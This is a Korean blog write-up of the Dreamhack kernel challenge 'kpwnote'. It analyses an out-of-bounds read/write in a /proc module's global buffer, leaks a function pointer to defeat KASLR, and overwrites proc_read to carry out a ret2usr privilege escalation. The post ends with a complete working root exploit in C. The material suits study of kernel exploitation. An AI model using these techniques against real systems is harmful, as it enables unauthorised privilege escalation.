---
title: "[Dreamhack] PWN kpwnote"
date: 2026-06-06T14:30:00+09:00
url: /2026/06/06/dreamhack-pwn-kpwnote/
tags: [Dreamhack, pwnable, wargame, writeup]
summary: "드림핵 포너블 kpwnote 문제풀이"
math: true
---
이번 문제는 dreamhack의 kpwnote 문제다. 리눅스 커널 익스플로잇의 가장 기본이라고 추천받아 이번 기회에 풀어봤다. 

문제 파일을 압축 해제하면 아래와 같은 파일들이 존재한다. 각 파일들에 대한 설명은 다음과 같다.

```
kpwnote/
└───[원본 제공]
    ├── vmlinuz                 # 부팅용 커널 이미지 (bzImage, 압축)
    ├── vmlinux                 # 디버그 심볼 포함 커널 ELF (분석/디버깅용)
    ├── initramfs.img           # 루트 파일시스템 (cpio newc, 압축 안됨)
    ├── linux-5.11.16.config    # 커널 빌드 설정 (보호기법 확인)
    ├── linux-5.11.16.patch     # kpwnote 모듈을 커널에 통합한 패치
    ├── linux-5.11.16/kpwnote/  # 취약 코드 소스 (impl.c, main.c ...)
    ├── no-shutdown.dtb         # microvm용 디바이스 트리 (shutdown 억제)
    └── run.sh                  # QEMU 부팅 스크립트
```

우선 qemu 부팅시 적용되는 보안 기법을 linux-5.11.16.config 에서 확인해보자.
```bash
╰─○ grep -E 'CONFIG_(RANDOMIZE_BASE|PAGE_TABLE_ISOLATION|STATIC_USERMODEHELPER|HARDENED_USERCOPY|STACKPROTECTOR)' linux-5.11.16.config; grep -- -append run.sh

CONFIG_RANDOMIZE_BASE=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_PAGE_TABLE_ISOLATION=y
CONFIG_HARDENED_USERCOPY=y
# CONFIG_HARDENED_USERCOPY_FALLBACK is not set
# CONFIG_HARDENED_USERCOPY_PAGESPAN is not set
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
        -append "reboot=t panic=-1 console=hvc0 quiet" \
```

각 설정에 대한 설명은 다음과 같다.

| 설정 | 설명 |
|---|---|
| `RANDOMIZE_BASE=y` | KASLR 활성화 → leak으로 slide 역산 필요 |
| `PAGE_TABLE_ISOLATION=y` | KPTI ON, 유저 복귀 까다로움 |
| `STACKPROTECTOR(_STRONG)=y` | 스택 카나리 활성화 |
| `HARDENED_USERCOPY=y` | copy_*_user 경계검사로 슬랩/스택만 대상, 전역(.data) OOB는 안 막음 |
| `SLAB_FREELIST_RANDOM=y` | 슬랩 freelist 랜덤화. 힙 grooming 할 때만 의미, 이 문제 무관 |
| `RETPOLINE = not set` | Spectre 완화 비활성화 |
| `STATIC_USERMODEHELPER=y` | ON, 아래 PATH와 묶어서 해석 |
| `STATIC_USERMODEHELPER_PATH ""` | 빈 문자열, usermodehelper 완전 비활성 |

우선 기본 설정을 보니 KASLR이 활성화 되어있어, 커널 slide leak이 필요하다. SMEP, SMAP 설정을 확인해보자.

```bash
~ $ grep -o 'smep\|smap' /proc/cpuinfo | sort -u
~ $ 
```

아무런 출력이 없다. 보호기법이 적용되지 않아, 커널은 유저모드 코드의 `commit_creds(prepare_kernel_cred(0));`같은 구문을 실행할 수 있다. 

위 설정을 보아 커널의 slide 값을 leak하고 uid를 0으로 만들어 execve로 /bin/sh을 실행하면 성공할 것 같다.


이제 커널에 적용된 main.c 코드를 살펴보자.
lseek, read, write 함수에 대해 커널 코드를 사용하도록 설정되어 있다.
```c
static struct proc_ops my_fops = {
	.proc_lseek = my_lseek,
	.proc_read = my_read,
	.proc_write = my_write,
};
```

이 main.c가 참조하는 impl.c 파일을 확인하면 각 기능에 대한 코드를 확인할 수 있다.

```c
#define INITSTR "hi\n"

static DECLARE_RWSEM(sem);
static loff_t tlen = sizeof(INITSTR) - 1;
static unsigned char tmp[1024] = INITSTR;
```

전역 변수부터 보자. `tmp`는 데이터를 담는 1024 바이트 버퍼이고 초기값으로 `"hi\n"`이 채워져 있다. `tlen`은 현재 유효한 데이터의 길이이며, `sem`은 `tmp`/`tlen`을 동시 접근으로부터 보호하는 rwsem이다. 즉 공격 표면은 `/proc/kpwnote`에 대한 read/write/lseek 함수를 통해 이루어진다.

```c
ssize_t my_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
	int res;
	size_t n;

	if (!count)
		return 0;

	if (count > OFFSET_MAX || *ppos > OFFSET_MAX - count)
		return -ENOSPC;

	res = down_write_killable(&sem);
	if (res)
		return res;

	n = copy_from_user(tmp + *ppos, buf, count);
	tlen = max(tlen, *ppos + (loff_t)(count - n));
	up_write(&sem);

	if (count == n)
		return -EFAULT;

	count -= n;
	*ppos += count;

	return count;
}
```

여기에 이 문제의 취약점이 존재한다. 데이터를 쓰는 위치는 `tmp + *ppos`인데, `*ppos`의 상한을 검사하는 코드가 **`OFFSET_MAX`(약 2^63)와 비교하는 것뿐**이다. 정작 버퍼의 실제 크기인 1024와 비교하는 경계검사가 없다. `*ppos`를 1024보다 크게 만들면 `tmp` 버퍼를 넘어 인접한 커널 전역 메모리에 그대로 쓸 수 있다(OOB Write).

`*ppos`를 컨트롤 해야한다. 이 `lseek` 함수를 이용한다. `my_lseek`은 `*ppos`를 임의의 값으로 설정할 수 있게 해준다.

한 가지 더 봐둘 것은 `tlen` 갱신 로직이다.

```c
n = copy_from_user(tmp + *ppos, buf, count);   // n = "복사 못 한" 바이트 수
tlen = max(tlen, *ppos + (loff_t)(count - n)); // count - n = 실제 쓴 양
```

`copy_from_user`는 복사한 양이 아니라 **복사하지 못한 바이트 수**를 반환한다. 따라서 `count - n`이 실제로 쓴 바이트가 되고, `tlen`은 "지금까지 쓰여진 가장 먼 지점"(high-water mark)으로 늘어나기만 한다.

```c
ssize_t my_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
	int res;

	if (!count)
		return 0;

	res = down_read_interruptible(&sem);
	if (res)
		return res;

	if (tlen > *ppos) {
		size_t n;
		loff_t maxlen = tlen - *ppos;

		if (maxlen <= SIZE_MAX && count > (size_t)maxlen)
			count = maxlen;

		n = copy_to_user(buf, tmp + *ppos, count);
		if (count == n)
			res = -EFAULT;

		count -= n;
	} else {
		count = 0;
	}
	up_read(&sem);

	if (res)
		return res;

	*ppos += count;

	return count;
}
```

read도 `tmp + *ppos`에서 유저로 데이터를 복사하므로, write와 마찬가지로 `*ppos`를 키우면 **OOB Read**가 된다. 다만 read에는 `if (tlen > *ppos)`라는 검증이 있다. 즉 읽으려는 위치가 `tlen`보다 작아야만 데이터를 돌려준다.

처음 `tlen`은 3이라, 멀리 떨어진 위치(예: 커널 전역이 있는 오프셋)를 그냥 읽으면 이 조건에 막혀 0바이트가 반환된다. 그런데 `tlen`을 키우는 곳은 앞서 본 `my_write`의 한 줄뿐이다. 따라서 OOB Read를 하려면 먼저 write가 선행되어 `tlen`을 읽으려는 위치 너머까지 늘려놓아야 한다.

```c
loff_t my_lseek(struct file *file, loff_t offset, int whence)
{
	loff_t res, eof;

	res = down_read_interruptible(&sem);
	if (res)
		return res;
	eof = tlen;
	up_read(&sem);

	return generic_file_llseek_size(file, offset, whence, OFFSET_MAX, eof);
}
```

`my_lseek`은 `eof = tlen`을 구한 뒤 실제 위치 계산/저장을 `generic_file_llseek_size`에 위임한다. read/write에 인자로 넘어오는 `*ppos`는 사실 커널이 파일마다 보관하는 `file->f_pos`이고, 그 값을 설정하는 것이 바로 lseek이다. 즉 유저는 `lseek(fd, X, SEEK_SET)`로 `*ppos`를 원하는 위치에 둔 뒤 read/write를 호출하는 식으로 OOB 위치를 제어한다.

`generic_file_llseek_size`는 내부적으로 `vfs_setpos`를 호출하는데, 이 함수가 음수 오프셋을 거부(`offset < 0` → `-EINVAL`)한다. 따라서 `*ppos`는 항상 0 이상이고, 결국 우리의 OOB는 `tmp`보다 높은 주소 방향(forward)으로만 가능하다. 따라서 `tmp`보다 낮은 주소에 있는 `modprobe_path` 같은 위치에는 도달할 수 없다.


impl.c를 통해 사용가능한 취약점은 다음과 같다.

- 전역 버퍼 `tmp`를 기준으로 앞쪽 위치로의 OOB Read/Write
- 위치는 `lseek`(`*ppos`)으로 제어
- Read는 `tlen` 게이팅이 있어, write로 `tlen`을 먼저 키운 뒤 read해야 함

커널의 `tmp` 뒤 +0x460 위에는 main.c에서 본 함수 포인터 표 `my_fops`가 놓여 있다. 즉 OOB로 `my_fops` 안의 함수 포인터를 읽어 KASLR slide를 leak하고, `my_fops`에 write 하여 특정 함수를 다른 위치로 조작할 수 있다.

## KASLR Leak

먼저 leak할 위치를 정하자. `my_fops`(struct proc_ops) 안에는 `my_read`/`my_write`/`my_lseek`의 커널 함수 주소가 들어있다. 이 중 하나를 읽으면 KASLR로 랜덤화된 커널 주소가 새고, nm으로 본 정적 주소와 빼면 slide를 구할 수 있다.

오프셋은 `nm vmlinux`로 계산한다.

```bash
$ nm vmlinux | grep -wE 'tmp|my_fops|my_read'
ffffffff81cab6a0 d tmp
ffffffff81cabb00 d my_fops
ffffffff812b4880 T my_read
```

`my_fops - tmp = 0x460`이고, struct proc_ops에서 `proc_read`(= my_read 포인터)는 구조체 시작에서 `+0x10` 위치다. 따라서 `my_read` 포인터는 `tmp + 0x470`에 있다.

여기서 impl.c 분석 때 본 `tlen` 게이팅이 걸린다. `0x470`을 읽으려면 `tlen`이 그보다 커야 하는데 처음엔 3이다. 그래서 읽을 포인터(0x470)는 건드리지 않으면서 `tlen`만 키우기 위해, 그 뒤쪽인 `0x478`(proc_read_iter, NULL이 존재하며 사용하지 않는 영역)에 write를 먼저 한다.

```c
int fd = open("/proc/kpwnote", O_RDWR);

char buf[8] = {0};
lseek(fd, 0x478, SEEK_SET);    // proc_read 포인터(0x470)보다 뒤에 write
write(fd, buf, 8);             // tlen = 0x480 으로 확장 (포인터는 보존)

lseek(fd, 0x470, SEEK_SET);    // proc_read 슬롯
unsigned long leak = 0;
read(fd, &leak, 8);            // 이제 tlen > ppos 통과 → leak
printf("leak = 0x%lx\n", leak);
```

실행하면 read 함수에 대한 커널 주소를 leak할 수 있다.

```
read 8 bytes, leak=0xffffffffaa2b4880
```

하위 비트 `...2b4880`이 nm의 `my_read`(`...812b4880`)와 일치하니 제대로 읽은 것이다. slide를 계산하면 다음과 같다.

```
slide = leak - my_read(static)
      = 0xffffffffaa2b4880 - 0xffffffff812b4880
      = 0x29000000
```

이제 모든 커널 심볼의 런타임 주소는 `정적주소 + slide`로 구할 수 있다.

## 흐름 조작

leak으로 KASLR을 우회했으니 이번엔 write로 `my_fops`의 함수 포인터를 덮어본다. `proc_read`(0x470)를 알아보기 쉬운 값으로 덮고 read를 호출하면, 커널이 그 값을 함수 주소로 보고 점프한다.

```c
unsigned long fake = 0x61616161;   // 'aaaa'
lseek(fd, 0x470, SEEK_SET);
write(fd, &fake, 8);               // proc_read 덮기

lseek(fd, 0x470, SEEK_SET);
char b; read(fd, &b, 1);           // 트리거
```

실행하면 커널이 우리가 쓴 주소에서 죽는다.

```
[    6.689181] general protection fault: 0000 [#1] SMP NOPTI
[    6.690250] RIP: 0010:0xf73ec00061616161
```

RIP 하위에 우리가 쓴 `0x61616161`('aaaa')이 그대로 들어갔다. 즉 `proc_read`를 원하는 주소로 덮으면 실행 흐름(RIP)을 완전히 가져올 수 있다는 것이 증명됐다. 8바이트를 정확히 쓰면 RIP 전체를 제어할 수 있다.

## ret2usr

보호기법 확인에서 SMEP/SMAP이 비활성화 된 것을 확인했다. SMEP가 꺼져 있으면 커널이 유저랜드 코드를 실행할 수 있다. 따라서 권한상승 로직을 담은 유저 함수를 만들고, `proc_read`를 그 함수 주소로 덮으면 커널이 대신 실행한다.

```c
void (*commit_creds)(unsigned long);
unsigned long (*prepare_kernel_cred)(unsigned long);

long escalate(void) {
    commit_creds(prepare_kernel_cred(0));   // 현재 프로세스를 root로
    return 0;                                // 정상 return → read() 정상 종료
}
```

`commit_creds(prepare_kernel_cred(0))`는 현재 프로세스의 cred를 root로 교체하는 구문이다. 주의할 점은 `commit_creds`로 직접 점프하면 안 된다. 이 함수는 rdi 인자로 cred를 받는데, 직접 뛰면 rdi에 이상 값(file 포인터)이 들어가 패닉이 발생한다. 그래서 `prepare_kernel_cred(0)`로 root cred를 먼저 만들어 넘기는 두 함수 호출을 escalate 안에서 처리한다.

escalate가 `commit_creds`, `prepare_kernel_cred`를 호출하려면 그 주소를 알아야 한다. 유저 프로그램은 커널 함수 주소를 모르므로, leak으로 구한 slide를 더해 런타임 주소를 함수 포인터에 채워둔다.

```c
commit_creds        = (void*)(0xffffffff810634e0UL + slide);
prepare_kernel_cred = (void*)(0xffffffff81063370UL + slide);
```

마지막으로 `proc_read`를 escalate 주소로 덮고 read로 트리거하면, 커널이 escalate를 실행해 프로세스가 root가 된다. escalate가 `return 0`으로 정상 복귀하면 read() 시스템콜도 정상 종료되고, 유저랜드로 돌아온 시점에 이미 root이므로 쉘 실행결과 root 권한을 확인할 수 있다.

## 전체 익스플로잇 코드

위 단계를 하나로 합친 최종 코드는 다음과 같다.

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

typedef unsigned long u64;

#define MY_READ_S  0xffffffff812b4880UL
#define COMMIT_S   0xffffffff810634e0UL
#define PREPARE_S  0xffffffff81063370UL

void (*commit_creds)(u64);
u64  (*prepare_kernel_cred)(u64);

long escalate(void) {
    commit_creds(prepare_kernel_cred(0));
    return 0;
}

int main(void) {
    int fd = open("/proc/kpwnote", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // [1] leak: tlen 확장(0x478) 후 0x470에서 my_read 포인터 read
    char buf[8] = {0};
    lseek(fd, 0x478, SEEK_SET);
    write(fd, buf, 8);
    lseek(fd, 0x470, SEEK_SET);
    u64 leak = 0;
    read(fd, &leak, 8);
    printf("[*] leak(my_read) = 0x%lx\n", leak);

    // [2] slide → 권한상승 함수 런타임 주소
    u64 slide = leak - MY_READ_S;
    commit_creds        = (void*)(COMMIT_S  + slide);
    prepare_kernel_cred = (void*)(PREPARE_S + slide);
    printf("[*] slide = 0x%lx\n", slide);

    // [3] proc_read(0x470)를 escalate 주소로 덮기
    lseek(fd, 0x470, SEEK_SET);
    u64 target = (u64)escalate;
    write(fd, &target, 8);

    // [4] read 트리거 → 커널이 escalate 실행 → root
    lseek(fd, 0x470, SEEK_SET);
    char b;
    read(fd, &b, 1);

    // [5] 확인 후 셸
    if (getuid() == 0) {
        printf("[+] root! uid=%d\n", getuid());
        char *argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
    } else {
        printf("[-] failed, uid=%d\n", getuid());
    }
    return 0;
}
```

